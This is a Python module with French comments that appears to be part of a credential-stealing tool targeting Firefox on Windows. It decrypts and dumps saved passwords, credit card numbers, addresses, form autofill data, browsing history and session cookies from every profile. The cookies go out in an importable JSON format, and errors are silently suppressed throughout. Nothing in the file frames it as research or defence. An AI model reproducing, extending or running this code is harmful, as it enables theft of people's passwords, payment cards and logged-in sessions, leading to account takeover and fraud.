import os
import glob
import json
import sqlite3
import tempfile
import shutil
from datetime import datetime
from pathlib import Path
from utils import nss_init, nss_decrypt, copy_db


# ============================================================
#  UTILS
# ============================================================
def safe_copy_full(base_path: Path, tmp_base: Path):
    """Copie places.sqlite + WAL + SHM pour éviter les bases verrouillées."""
    try:
        shutil.copy2(base_path, tmp_base)
        for ext in ["-wal", "-shm"]:
            src = Path(str(base_path) + ext)
            dst = Path(str(tmp_base) + ext)
            if src.exists():
                shutil.copy2(src, dst)
        return True
    except Exception:
        return False


def firefox_profiles():
    """Retourne les profils Firefox sous Windows."""
    profiles_dir = Path(os.getenv("APPDATA")) / "Mozilla" / "Firefox" / "Profiles"
    if profiles_dir.exists():
        return [p for p in profiles_dir.iterdir() if p.is_dir()]
    return []


# ============================================================
#  MOTS DE PASSE
# ============================================================
def extract_firefox_passwords(dumper):
    profiles = firefox_profiles()
    if not profiles:
        return

    for profile in profiles:
        logins = profile / "logins.json"
        if not logins.exists():
            continue

        profile_name = profile.name
        if not nss_init(str(profile)):
            continue

        try:
            data = json.loads(logins.read_text(encoding="utf-8"))
            lines = []
            for login in data.get("logins", []):
                url = login.get("hostname", "")
                user = nss_decrypt(login.get("encryptedUsername", "")) or ""
                pwd = nss_decrypt(login.get("encryptedPassword", "")) or ""
                created = login.get("timeCreated")
                created = datetime.fromtimestamp(created / 1000).strftime("%Y-%m-%d %H:%M") if created else "N/A"
                lines.append(f"{url} | {user} | {pwd} | Créé : {created}")

            if lines:
                dumper.save(
                    f"Firefox_{profile_name}_passwords.txt",
                    "\n".join(lines),
                    "Passwords"
                )
        except Exception:
            pass


# ============================================================
#  HISTORIQUE FORMULAIRES
# ============================================================
def extract_firefox_formhistory(dumper):
    profiles = firefox_profiles()
    if not profiles:
        return

    for profile in profiles:
        form_db = profile / "formhistory.sqlite"
        if not form_db.exists():
            continue

        profile_name = profile.name
        tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".db").name

        try:
            if copy_db(str(form_db), tmp):
                conn = sqlite3.connect(tmp)
                cur = conn.cursor()
                cur.execute("""
                    SELECT fieldname, value, timesUsed, firstUsed, lastUsed
                    FROM moz_formhistory
                """)
                entries = []
                for name, value, times, first, last in cur.fetchall():
                    if value:
                        first_str = datetime.fromtimestamp(first / 1_000_000).strftime("%Y-%m-%d %H:%M") if first else "N/A"
                        last_str = datetime.fromtimestamp(last / 1_000_000).strftime("%Y-%m-%d %H:%M") if last else "N/A"
                        entries.append(
                            f"[{name}] : {value} | Utilisé {times}x | {first_str} → {last_str}"
                        )
                conn.close()

                if entries:
                    dumper.save(
                        f"Firefox_{profile_name}_form_autofill.txt",
                        "\n".join(entries),
                        "Autofill"
                    )
        except Exception:
            pass
        finally:
            try:
                os.unlink(tmp)
            except:
                pass


# ============================================================
#  ADRESSES ENREGISTRÉES
# ============================================================
def extract_firefox_addresses(dumper):
    profiles_dir = os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
    if not os.path.exists(profiles_dir):
        return

    for profile_dir in glob.glob(os.path.join(profiles_dir, "*.*")):
        if not os.path.isdir(profile_dir):
            continue

        profile_name = os.path.basename(profile_dir)
        lines = []

        # addresses.json
        addr_json = os.path.join(profile_dir, "addresses.json")
        if os.path.exists(addr_json):
            try:
                with open(addr_json, "r", encoding="utf-8") as f:
                    data = json.load(f)
                for addr in data.get("addresses", []):
                    lines.append(f"[ADRESSE] {addr.get('given-name', '')} {addr.get('family-name', '')}")
                    for k in ["street-address", "locality", "region", "postal-code", "country", "tel", "email"]:
                        if addr.get(k):
                            lines.append(f"  {k} : {addr[k]}")
                    lines.append("---")
            except:
                pass

        # formhistory.sqlite (complément)
        formhistory = os.path.join(profile_dir, "formhistory.sqlite")
        if os.path.exists(formhistory):
            temp_db = tempfile.NamedTemporaryFile(delete=False).name
            try:
                shutil.copy(formhistory, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT fieldname, value FROM moz_formhistory WHERE value IS NOT NULL")
                for field, value in cursor.fetchall():
                    if any(x in field.lower() for x in ["address", "city", "postal", "country", "street"]):
                        lines.append(f"{field} : {value}")
                conn.close()
            except:
                pass
            finally:
                try:
                    os.unlink(temp_db)
                except:
                    pass

        if lines:
            dumper.save(
                f"Firefox_{profile_name}_addresses.txt",
                "\n".join(lines),
                "Autofill"
            )


# ============================================================
#  CARTES BANCAIRES
# ============================================================
def extract_firefox_creditcards(dumper):
    profiles_dir = os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
    if not os.path.exists(profiles_dir):
        return

    for profile_dir in glob.glob(os.path.join(profiles_dir, "*.*")):
        if not os.path.isdir(profile_dir):
            continue

        profile_name = os.path.basename(profile_dir)
        logins_path = os.path.join(profile_dir, "logins.json")
        if not os.path.exists(logins_path):
            continue

        if not nss_init(profile_dir):
            continue

        try:
            with open(logins_path, "r", encoding="utf-8") as f:
                data = json.load(f)

            cards = []
            for entry in data.get("logins", []):
                cc_enc = entry.get("cc-number-encrypted")
                if not cc_enc:
                    continue
                decrypted_number = nss_decrypt(cc_enc)
                card = {
                    "name": entry.get("cc-name", ""),
                    "number": decrypted_number,
                    "exp_month": entry.get("cc-exp-month"),
                    "exp_year": entry.get("cc-exp-year"),
                    "created": entry.get("timeCreated")
                }
                cards.append(card)

            if cards:
                lines = []
                for card in cards:
                    created = (
                        datetime.fromtimestamp(card["created"] / 1000).strftime("%Y-%m-%d %H:%M")
                        if card.get("created") else "N/A"
                    )
                    lines.append(f"[CARTE] {card['name']}")
                    lines.append(f"  Numéro   : {card['number']}")
                    lines.append(f"  Exp       : {card['exp_month']}/{card['exp_year']}")
                    lines.append(f"  Créé      : {created}")
                    lines.append("---")

                dumper.save(
                    f"Firefox_{profile_name}_creditcards.txt",
                    "\n".join(lines),
                    "Autofill"
                )
        except Exception:
            pass


# ============================================================
#  HISTORIQUE NAVIGATION
# ============================================================
def extract_firefox_history(dumper):
    profiles = firefox_profiles()
    if not profiles:
        return

    for profile in profiles:
        places = profile / "places.sqlite"
        if not places.exists():
            continue

        profile_name = profile.name
        tmp = Path(tempfile.gettempdir()) / f"fx_{profile_name}.sqlite"

        if not safe_copy_full(places, tmp):
            continue

        try:
            conn = sqlite3.connect(f"file:{tmp}?mode=ro", uri=True, timeout=30)
            cur = conn.cursor()
            cur.execute("""
                SELECT
                    COALESCE(url, ''),
                    COALESCE(title, 'Sans titre'),
                    DATETIME(last_visit_date/1000000, 'unixepoch')
                FROM moz_places
                WHERE url IS NOT NULL
                ORDER BY last_visit_date DESC
            """)
            rows = cur.fetchall()
            conn.close()

            if rows:
                lines = ["URL | Titre | Date", "-"*120]
                for url, title, date in rows:
                    lines.append(f"{url} | {title[:80]} | {date or 'Inconnu'}")

                dumper.save(
                    f"History_Firefox_{profile_name}.txt",
                    "\n".join(lines),
                    "History"
                )
        except Exception:
            pass
        finally:
            try:
                tmp.unlink(missing_ok=True)
                Path(str(tmp) + "-wal").unlink(missing_ok=True)
                Path(str(tmp) + "-shm").unlink(missing_ok=True)
            except:
                pass


# ============================================================
#  COOKIES
# ============================================================
def extract_firefox_cookies(dumper):
    profiles_dir = Path(os.getenv("APPDATA")) / "Mozilla" / "Firefox" / "Profiles"
    if not profiles_dir.exists():
        return

    for profile in profiles_dir.iterdir():
        if not profile.is_dir():
            continue

        profile_name = profile.name
        cookies_db = profile / "cookies.sqlite"
        if not cookies_db.exists():
            continue

        if not nss_init(str(profile)):
            continue

        temp_copy = Path(tempfile.gettempdir()) / f"cookies_{profile_name}.sqlite"
        try:
            shutil.copy2(cookies_db, temp_copy)
            for ext in ["-wal", "-shm"]:
                src = profile / f"cookies.sqlite{ext}"
                if src.exists():
                    shutil.copy2(src, temp_copy.with_suffix(temp_copy.suffix + ext))
        except:
            continue

        cookies_list = []
        try:
            conn = sqlite3.connect(f"file:{temp_copy}?mode=ro", uri=True, timeout=30)
            cur = conn.cursor()
            cur.execute("""
                SELECT host, name, value, path, expiry, isSecure, isHttpOnly
                FROM moz_cookies
            """)
            for host, name, value, path, expiry, secure, httponly in cur.fetchall():
                decrypted_value = nss_decrypt(value) or value
                cookie_obj = {
                    "host": host,
                    "name": name,
                    "value": decrypted_value,
                    "path": path or "/",
                    "secure": bool(secure),
                    "httpOnly": bool(httponly),
                    "sameSite": "no_restriction",
                    "expirationDate": expiry if expiry else 0
                }
                cookies_list.append(cookie_obj)
            conn.close()
        except Exception:
            pass
        finally:
            for p in [temp_copy, Path(str(temp_copy) + "-wal"), Path(str(temp_copy) + "-shm")]:
                try:
                    p.unlink(missing_ok=True)
                except:
                    pass

        if cookies_list:
            dumper.save(
                f"Firefox_{profile_name}_cookies.json",
                json.dumps(cookies_list, indent=2, ensure_ascii=False),
                "Cookies"
            )